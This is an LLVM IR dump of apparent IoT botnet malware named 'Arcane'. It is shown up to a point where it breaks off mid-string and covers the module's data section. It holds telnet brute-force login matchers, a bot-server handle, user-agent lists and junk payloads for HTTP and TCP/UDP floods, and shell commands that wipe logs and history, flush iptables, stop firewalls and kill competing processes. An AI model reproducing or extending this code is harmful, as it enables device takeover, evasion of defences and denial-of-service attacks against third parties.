; ModuleID = 'host/ir_bcf/Arcane.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon.2 }
%struct.anon.2 = type { i16, i16, i16, i16 }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.ifreq = type { %union.anon.4, %union.anon.5 }
%union.anon.4 = type { [16 x i8] }
%union.anon.5 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@useragents = global [59 x i8*] [i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([173 x i8], [173 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([154 x i8], [154 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([122 x i8], [122 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.65, i32 0, i32 0)], align 16
@.str.8 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36\00", align 1
@.str.9 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.10 = private unnamed_addr constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\00", align 1
@.str.11 = private unnamed_addr constant [31 x i8] c"TheSuBot/0.2 (www.thesubot.de)\00", align 1
@.str.12 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.13 = private unnamed_addr constant [55 x i8] c"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)\00", align 1
@.str.14 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.15 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.16 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1\00", align 1
@.str.17 = private unnamed_addr constant [48 x i8] c"zspider/0.9-dev http://feedback.redkolibri.com/\00", align 1
@.str.18 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00", align 1
@.str.19 = private unnamed_addr constant [101 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)\00", align 1
@.str.20 = private unnamed_addr constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00", align 1
@.str.21 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.22 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3\00", align 1
@.str.23 = private unnamed_addr constant [173 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)\00", align 1
@.str.24 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\00", align 1
@.str.25 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.26 = private unnamed_addr constant [109 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15\00", align 1
@.str.27 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.28 = private unnamed_addr constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00", align 1
@.str.29 = private unnamed_addr constant [60 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)\00", align 1
@.str.30 = private unnamed_addr constant [103 x i8] c"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\00", align 1
@.str.31 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.32 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00", align 1
@.str.33 = private unnamed_addr constant [154 x i8] c"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532\00", align 1
@.str.34 = private unnamed_addr constant [112 x i8] c"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US\00", align 1
@.str.35 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00", align 1
@.str.36 = private unnamed_addr constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00", align 1
@.str.37 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00", align 1
@.str.38 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00", align 1
@.str.39 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00", align 1
@.str.40 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; cn) Opera 11.00\00", align 1
@.str.41 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00", align 1
@.str.42 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00", align 1
@.str.43 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)\00", align 1
@.str.44 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)\00", align 1
@.str.45 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)\00", align 1
@.str.46 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.47 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8\00", align 1
@.str.48 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.49 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0\00", align 1
@.str.50 = private unnamed_addr constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)\00", align 1
@.str.51 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.52 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\00", align 1
@.str.53 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.54 = private unnamed_addr constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00", align 1
@.str.55 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01\00", align 1
@.str.56 = private unnamed_addr constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00", align 1
@.str.57 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00", align 1
@.str.58 = private unnamed_addr constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00", align 1
@.str.59 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.60 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.61 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.62 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.63 = private unnamed_addr constant [122 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.64 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.65 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@BusyBoxPayload = global i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.66, i32 0, i32 0), align 8
@.str.66 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@usernames = global [0 x i8*] zeroinitializer, align 8
@tmpdirs = global [11 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.76, i32 0, i32 0), i8* null], align 16
@.str.67 = private unnamed_addr constant [15 x i8] c"/dev/netslink/\00", align 1
@.str.68 = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.69 = private unnamed_addr constant [6 x i8] c"/var/\00", align 1
@.str.70 = private unnamed_addr constant [6 x i8] c"/dev/\00", align 1
@.str.71 = private unnamed_addr constant [10 x i8] c"/var/run/\00", align 1
@.str.72 = private unnamed_addr constant [10 x i8] c"/dev/shm/\00", align 1
@.str.73 = private unnamed_addr constant [6 x i8] c"/mnt/\00", align 1
@.str.74 = private unnamed_addr constant [7 x i8] c"/boot/\00", align 1
@.str.75 = private unnamed_addr constant [6 x i8] c"/usr/\00", align 1
@.str.76 = private unnamed_addr constant [6 x i8] c"/opt/\00", align 1
@advances = global [5 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.80, i32 0, i32 0), i8* null], align 16
@.str.77 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.78 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.79 = private unnamed_addr constant [8 x i8] c"sername\00", align 1
@.str.80 = private unnamed_addr constant [8 x i8] c"assword\00", align 1
@fails = global [8 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.87, i32 0, i32 0), i8* null], align 16
@.str.81 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.82 = private unnamed_addr constant [6 x i8] c"ailed\00", align 1
@.str.83 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.84 = private unnamed_addr constant [6 x i8] c"enied\00", align 1
@.str.85 = private unnamed_addr constant [5 x i8] c"rror\00", align 1
@.str.86 = private unnamed_addr constant [7 x i8] c"oodbye\00", align 1
@.str.87 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@successes = global [4 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.90, i32 0, i32 0), i8* null], align 16
@.str.88 = private unnamed_addr constant [8 x i8] c"busybox\00", align 1
@.str.89 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.90 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@advances2 = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.90, i32 0, i32 0), i8* null], align 16
@botnetServer = global i32 -1, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@switchCommStock = global i32 0, align 4
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@botnetPid = common global i32 0, align 4
@ServerInfo = common global [100 x i32] zeroinitializer, align 16
@ourPublicIP = common global %struct.in_addr zeroinitializer, align 4
@.str = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.1 = private unnamed_addr constant [16 x i8] c"/usr/bin/python\00", align 1
@.str.2 = private unnamed_addr constant [14 x i8] c"Python Device\00", align 1
@.str.3 = private unnamed_addr constant [14 x i8] c"/usr/bin/perl\00", align 1
@.str.4 = private unnamed_addr constant [12 x i8] c"Perl Device\00", align 1
@.str.5 = private unnamed_addr constant [18 x i8] c"/usr/sbin/telnetd\00", align 1
@.str.6 = private unnamed_addr constant [14 x i8] c"Telnet Device\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"Unknown\00", align 1
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@rand_alphastr.alphaset = internal constant [32 x i8] c"xq6fh0jrwxiugrogtzqf5p28fnxlm5j\00", align 16
@.str.144 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.91 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@GIP.ipState = internal global [4 x i8] zeroinitializer, align 1
@.str.92 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.93 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.94 = private unnamed_addr constant [34 x i8] c"Arcane Bruteforced = %s [ %s:%s ]\00", align 1
@.str.95 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.96 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.97 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.98 = private unnamed_addr constant [265 x i8] c"\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\00", align 1
@.str.99 = private unnamed_addr constant [17 x i8] c"/etc/resolv.conf\00", align 1
@.str.100 = private unnamed_addr constant [39 x i8] c"nameserver 8.8.8.8\0Anameserver 8.8.4.4\0A\00", align 1
@.str.101 = private unnamed_addr constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00", align 1
@.str.102 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.103 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.104 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.105 = private unnamed_addr constant [12 x i8] c"iptables -F\00", align 1
@.str.106 = private unnamed_addr constant [17 x i8] c"pkill -9 busybox\00", align 1
@.str.107 = private unnamed_addr constant [14 x i8] c"pkill -9 perl\00", align 1
@.str.108 = private unnamed_addr constant [16 x i8] c"pkill -9 python\00", align 1
@.str.109 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.110 = private unnamed_addr constant [37 x i8] c"/sbin/iptables -F; /sbin/iptables -X\00", align 1
@.str.111 = private unnamed_addr constant [23 x i8] c"service firewalld stop\00", align 1
@.str.112 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.113 = private unnamed_addr constant [11 x i8] c"history -c\00", align 1
@.str.114 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.115 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.116 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.117 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.118 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.119 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.120 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.121 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.122 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.123 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@sendSTD.hexstring = private unnamed_addr constant [1 x i8*] [i8* getelementptr inbounds ([1021 x i8], [1021 x i8]* @.str.124, i32 0, i32 0)], align 8
@.str.124 = private unnamed_addr constant [1021 x i8] c"/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ